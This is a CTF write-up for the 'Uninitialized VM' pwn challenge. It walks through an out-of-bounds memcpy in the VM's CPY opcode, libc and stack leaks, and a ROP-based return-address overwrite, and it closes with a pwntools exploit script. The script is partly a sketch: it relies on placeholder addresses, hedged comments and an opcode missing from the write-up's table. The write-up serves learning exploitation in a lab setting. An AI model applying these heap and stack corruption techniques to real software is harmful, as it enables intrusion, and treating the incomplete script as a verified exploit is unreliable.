+++
title = "Uninitialized VM"
date = 2025-07-08
authors = ["Thirukailash"] 
+++

**Description**

Just cooked up a simple VM, forgot to check for bugs tho.

## **Files provided**

    vm_chall
    Dockerfile
    libc.so.6
    ld-linux-x86-64.so.2
    flag.txt

## Vulnerability

- `CPY` opcode uses `memcpy()` with attacker-controlled size and indices.
- No bounds checks → memory corruption.
- Can copy data *into and out of* the VM stack and manipulate key structures.

---

## Key Opcodes for exploit

| Opcode   | Meaning             |
|----------|---------------------|
| `0x36`   | `CPY` (vuln here)   |
| `0x31`   | `PUSH`              |
| `0x32`   | `PUSH_R`            |
| `0x33`   | `POP_R`             |
| `0x35`   | `MOV_R_X`           |
| `0x44`   | `SUB`               |
| `0x43`   | `ADD`               |

---

## Exploit summary

The vulnerability lies in a broken VM instruction: **`CPY`**, which uses `memcpy()` without bounds checking. This gives us **out-of-bounds memory read/write** from within the VM.

---

### Step 1: Copy `regs` Struct to VM Stack

- Use the vulnerable `CPY` instruction to copy the `regs` struct onto the VM's stack.
- Modify register values (`sp`, `bp`, `pc`, etc.) using VM instructions like `ADD`, `SUB`, `MOV`, etc.
- These modifications are possible because the VM allows arithmetic on its stack contents.

---

### Step 2: Regain Control Over VM Stack

- After editing the copied `regs`, copy it back into its original location using `CPY`.
- This gives full control over the VM’s:
  - **Stack pointer (`sp`)**
  - **Base pointer (`bp`)**
  - **Program counter (`pc`)**
- Now we can use VM opcodes like `PUSH`, `POP`, and `CPY` to read/write arbitrary memory.

---

### Step 3: Leak libc via Heap Metadata

- The `expand()` function frees the old memory chunks and reallocates them.
- Freed chunks leave **unsorted bin metadata** (heap freelist pointers) in memory.
- Use VM stack read to extract those pointers → gives a **libc leak**.

---

### Step 4: Leak Stack Address via `environ`

- Use leaked libc base to compute the address of `environ`.
- `environ` holds a pointer to the actual stack top.
- Copy `environ` to the VM stack, then use `POP_R` to load it into a VM register.

---

### Step 5: Stack Pivot + Return Address Overwrite

Now that we know the real stack address:

- Set the VM stack to overlap the **main() function’s stack frame**.
- Push a **ROP chain** onto the return address using the VM’s `PUSH` opcode.
- When execution returns from main, it hits our payload.

---

## Final Exploit Script

The following Python script uses `pwntools` to exploit the Uninitialized VM by triggering an out-of-bounds `memcpy`, leaking `libc` and `stack`, and hijacking control flow.

```python
#!/usr/bin/env python3
from pwn import *

context.binary = ELF("./vm_chall")
libc = ELF("./libc.so.6")
context.terminal = ["tmux", "splitw", "-h"]
context.log_level = "debug"

# Start the target process or connect remotely
def launch():
    if args.REMOTE:
        return remote("host", 1337)  # Replace with actual host/port
    elif args.GDB:
        return gdb.debug("./vm_chall", gdbscript="""
            break *main+1695
            continue
        """)
    else:
        return process("./vm_chall")

# Short helpers to emit bytecode for each instruction
def b(x): return p8(x)
def reg(r): return b(r & 7)

def op_push_imm(val): return b(0x35) + reg(0) + p64(val)
def op_push(val): return b(0x31) + b(val)
def op_push_r(r): return b(0x32) + reg(r)
def op_pop_r(r): return b(0x33) + reg(r)
def op_mov(dst, src): return b(0x34) + reg(dst) + reg(src)
def op_cpy(dst_r, src_r, size): return b(0x36) + reg(dst_r) + reg(src_r) + b(size) + b(0) * 2  # pad to skip PC += 3
def op_add(r1, r2): return b(0x43) + reg(r1) + reg(r2)
def op_and(r1, r2): return b(0x38) + reg(r1) + reg(r2)
def op_not(r): return b(0x40) + reg(r)
def op_jmp(offset): return b(0x45) + b(offset)

# Construct the payload
def build_payload():
    payload = b''

    # Step 1: Fill stack space to operate on
    for _ in range(16):
        payload += op_push(0x00)

    # Step 2: Copy `regs` struct to VM stack 
    payload += op_push_imm(0xef)
    payload += op_push_imm(0xff)
    payload += op_mov(0, 0)     # r0 = 0xef
    payload += op_mov(1, 1)     # r1 = 0xff
    payload += op_cpy(0, 1, 0x80)

    # Step 3: Prepare modified `regs` on stack (e.g., set new PC/sp/bp)
    payload += op_pop_r(3)      # Assume r3 = heap libc ptr
    payload += op_pop_r(4)      # r4 = PC
    payload += op_push_imm(0x12345678)  # Replace with address of environ or main stack
    payload += op_pop_r(5)      # r5 = stack base
    payload += op_push_imm(0xffffffffffffffff)
    payload += op_pop_r(6)      # r6 = end marker
    payload += op_cpy(1, 0, 0x80)  # Copy back regs

    # Step 4: Stack pivot → target real stack
    payload += op_push_imm(0xdeadbeefcafebabe)  # one_gadget or ret address
    for _ in range(3):
        payload += op_push(0x00)

    return payload

# Main
io = launch()

# Initial VM prompt sequence
for _ in range(2):
    io.sendlineafter(b"[ lEn? ] >> ", b"1")
    io.sendlineafter(b"[ BYTECODE ] >>", b"a")

# Final exploit payload
bytecode = build_payload()
assert len(bytecode) < 256

io.sendlineafter(b"[ lEn? ] >> ", str(len(bytecode)).encode())
io.sendlineafter(b"[ BYTECODE ] >>", bytecode)
io.interactive()

``````

 This challenge was a great learning experience. I gained a deeper understanding of custom VM environments, memory layout manipulation, and struct-based exploitation. Thanks to the bi0sCTF team for such an excellent problem.
